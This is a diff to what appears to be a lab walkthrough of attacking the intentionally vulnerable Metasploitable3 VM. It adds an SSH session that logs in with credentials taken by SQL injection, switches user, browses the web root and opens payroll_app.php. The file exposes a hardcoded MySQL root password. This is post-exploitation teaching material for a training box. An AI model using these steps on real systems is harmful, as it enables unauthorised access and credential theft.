@@ -11,7 +11,34 @@ categories:
 
  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
 
-After performing SQL Injection using SQLmap, use the credentials that has been retrieved and login into the Metasploitable3 via SSH. Navigate to the var/www/html directory to locate the Apache web server documents. Open the payroll_app.php and explore the file to retrieve login credentials.
+After performing SQL Injection using SQLmap, and after adding a root user credentials - login into the Metasploitable3 via SSH. Navigate to the var/www/html directory to locate the Apache web server documents. 
+
+```shell
+┌─[parrot@parrot]─[~]
+└──╼ $ssh leia_organa@10.0.2.28
+leia_organa@10.0.2.28's password: 
+Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+Last login: Tue Mar  5 12:28:27 2024 from 10.0.2.16
+
+leia_organa@metasploitable3-ub1404:~$ su abril
+Password: 
+abril@metasploitable3-ub1404:/home/leia_organa$ cd ..
+abril@metasploitable3-ub1404:/home$ ls
+abril             artoo_detoo  boba_fett  c_three_pio  greedo    jabba_hutt    kylo_ren          leia_organa     vagrant
+anakin_skywalker  ben_kenobi   chewbacca  darth_vader  han_solo  jarjar_binks  lando_calrissian  luke_skywalker
+abril@metasploitable3-ub1404:/home$ cd ..
+abril@metasploitable3-ub1404:/$ ls
+bin   dev  home        initrd.img.old  lib64       media  node_modules  proc  run   srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib             lost+found  mnt    opt           root  sbin  sys  usr  vmlinuz
+abril@metasploitable3-ub1404:/$ cd var/www/html
+abril@metasploitable3-ub1404:/var/www/html$ ls
+6GTNp.php  chat  DCz17U.php  drupal  jnf29p.php  MbES5.php  napXB.php  payroll_app.php  phpmyadmin
+abril@metasploitable3-ub1404:/var/www/html$ nano payroll_app.php
+```
+
+Open the payroll_app.php and explore the file to retrieve login credentials.
 
 ```php
 $conn = new mysqli('127.0.0.1', 'root', 'sploitme', 'payroll');
